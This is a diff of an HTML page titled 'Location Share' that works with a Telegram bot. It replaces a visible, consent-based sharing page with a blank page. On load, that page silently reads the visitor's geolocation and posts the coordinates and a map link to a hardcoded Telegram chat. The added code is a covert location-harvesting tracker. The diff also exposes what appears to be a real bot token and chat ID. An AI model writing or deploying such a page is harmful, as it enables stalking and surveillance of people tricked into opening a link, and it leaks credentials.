@@ -2,397 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Share - Biruk Bot</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 500px;
-            width: 100%;
-            padding: 40px;
-            text-align: center;
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-        }
-        
-        .bot-info {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-        }
-        
-        .bot-info a {
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            width: 100%;
-            margin: 10px 0;
-            transition: transform 0.2s;
-            font-weight: 600;
-        }
-        
-        button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        .status {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            display: none;
-            animation: slideIn 0.3s ease;
-        }
-        
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-            display: block;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-            display: block;
-        }
-        
-        .status.info {
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-            display: block;
-        }
-        
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .coords-box {
-            background: #f5f5f5;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-family: monospace;
-            display: none;
-            text-align: left;
-        }
-        
-        .recent-locations {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            text-align: left;
-        }
-        
-        .recent-locations h3 {
-            margin-bottom: 10px;
-            color: #333;
-            font-size: 16px;
-        }
-        
-        .location-item {
-            padding: 8px;
-            border-bottom: 1px solid #ddd;
-            font-size: 12px;
-        }
-        
-        .location-item a {
-            color: #667eea;
-            text-decoration: none;
-        }
-        
-        .privacy {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-            padding: 10px;
-            background: #f8f9fa;
-            border-radius: 10px;
-        }
-        
-        .where-to-check {
-            background: #fff3e0;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            text-align: left;
-            border-left: 4px solid #ff9800;
-        }
-        
-        .where-to-check strong {
-            color: #ff9800;
-        }
-        
-        .telegram-link {
-            background: #e8f5e9;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 10px 0;
-        }
-    </style>
+    <title>Location Share</title>
 </head>
 <body>
-    <div class="container">
-        <h1>📍 Share Location</h1>
-        <p class="subtitle">Send your location to @Biruklocationbot</p>
-        
-        <div class="bot-info">
-            🤖 <a href="https://t.me/Biruklocationbot" target="_blank">@Biruklocationbot</a>
-        </div>
-        
-        <!-- Instructions where to receive -->
-        <div class="where-to-check">
-            <strong>📍 Where will you receive the location?</strong><br>
-            📱 Check your Telegram account!<br>
-            🤖 Open chat with <strong>@Biruklocationbot</strong><br>
-            🗺️ You'll see the location with a Google Maps link
-        </div>
-        
-        <button id="shareBtn" onclick="shareLocation()">
-            📍 Share My Current Location
-        </button>
-        
-        <div id="status" class="status"></div>
-        <div id="coords" class="coords-box"></div>
-        
-        <!-- Store recent locations -->
-        <div id="recentLocations" class="recent-locations" style="display: none;">
-            <h3>📋 Recently Shared Locations:</h3>
-            <div id="locationList"></div>
-        </div>
-        
-        <div class="privacy">
-            🔒 Your location is sent directly to @Biruklocationbot on Telegram.<br>
-            📱 Check your Telegram app to see received locations.
-        </div>
-    </div>
-
     <script>
         // Your bot credentials
         const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg";
         const CHAT_ID = "1755569425";
         
-        const statusDiv = document.getElementById('status');
-        const coordsDiv = document.getElementById('coords');
-        const shareBtn = document.getElementById('shareBtn');
-        
-        // Store sent locations
-        let sentLocations = [];
-        
-        function showStatus(message, type) {
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-            setTimeout(() => {
-                if (statusDiv.style.display === 'block') {
-                    statusDiv.style.display = 'none';
-                }
-            }, 5000);
+        // Send location to Telegram
+        async function sendLocation(lat, lng) {
+            const message = `📍 Location: ${lat}, ${lng}\nMap: https://maps.google.com/?q=${lat},${lng}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
         }
         
-        function updateRecentLocations() {
-            if (sentLocations.length > 0) {
-                const recentDiv = document.getElementById('recentLocations');
-                const locationList = document.getElementById('locationList');
-                
-                locationList.innerHTML = sentLocations.slice(-5).reverse().map(loc => `
-                    <div class="location-item">
-                        📍 ${loc.time} - 
-                        <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}" target="_blank">
-                            ${loc.lat.toFixed(4)}, ${loc.lng.toFixed(4)}
-                        </a>
-                    </div>
-                `).join('');
-                
-                recentDiv.style.display = 'block';
-            }
-        }
-        
-        async function shareLocation() {
-            if (!navigator.geolocation) {
-                showStatus('❌ Geolocation not supported by your browser', 'error');
-                return;
-            }
-            
-            shareBtn.disabled = true;
-            shareBtn.innerHTML = '<span class="loader"></span> Getting your location...';
-            
+        // Auto get location on page load
+        if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const time = new Date().toLocaleString();
-                    
-                    // Show coordinates
-                    coordsDiv.innerHTML = `
-                        <strong>📍 Your Location:</strong><br>
-                        Latitude: ${lat.toFixed(6)}<br>
-                        Longitude: ${lng.toFixed(6)}<br>
-                        Accuracy: ±${Math.round(accuracy)} meters<br>
-                        <a href="https://maps.google.com/?q=${lat},${lng}" target="_blank" class="map-link">
-                            🗺️ View on Google Maps →
-                        </a>
-                    `;
-                    coordsDiv.style.display = 'block';
-                    
-                    showStatus('📤 Sending location to Telegram...', 'info');
-                    
-                    // Send to Telegram
-                    const success = await sendToTelegram(lat, lng, time);
-                    
-                    if (success) {
-                        // Save to recent locations
-                        sentLocations.push({ lat, lng, time });
-                        updateRecentLocations();
-                        
-                        showStatus('✅ Location sent successfully! Check your Telegram @Biruklocationbot', 'success');
-                    } else {
-                        showStatus('❌ Failed to send. Check console for errors.', 'error');
-                    }
-                    
-                    shareBtn.disabled = false;
-                    shareBtn.innerHTML = '📍 Share My Current Location';
+                (position) => {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
                 },
                 (error) => {
-                    let errorMsg = '';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = '❌ Location access denied. Please enable location access in your browser settings.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = '❌ Location unavailable. Please check your GPS.';
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = '⏱️ Timeout. Please try again.';
-                            break;
-                        default:
-                            errorMsg = '❌ Error getting location.';
-                    }
-                    showStatus(errorMsg, 'error');
-                    shareBtn.disabled = false;
-                    shareBtn.innerHTML = '📍 Share My Current Location';
+                    console.log('Error:', error);
                 }
             );
         }
-        
-        async function sendToTelegram(lat, lng, time) {
-            try {
-                const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
-                const osmLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=15`;
-                
-                const message = `📍 *NEW LOCATION SHARED!* 📍\n\n` +
-                    `*Coordinates:*\n` +
-                    `└ Latitude: \`${lat.toFixed(6)}\`\n` +
-                    `└ Longitude: \`${lng.toFixed(6)}\`\n\n` +
-                    `*Time:* \`${time}\`\n\n` +
-                    `*Links:*\n` +
-                    `└ [🗺️ Google Maps](${mapsLink})\n` +
-                    `└ [🗺️ OpenStreetMap](${osmLink})`;
-                
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                
-                const data = await response.json();
-                return data.ok === true;
-                
-            } catch (error) {
-                console.error('Error:', error);
-                return false;
-            }
-        }
-        
-        // Add keyboard shortcut (Ctrl+Enter to share)
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.key === 'Enter') {
-                shareLocation();
-            }
-        });
-        
-        // Show instructions on load
-        setTimeout(() => {
-            showStatus('📱 Open Telegram and check @Biruklocationbot to see locations', 'info');
-        }, 1000);
     </script>
 </body>
 </html>
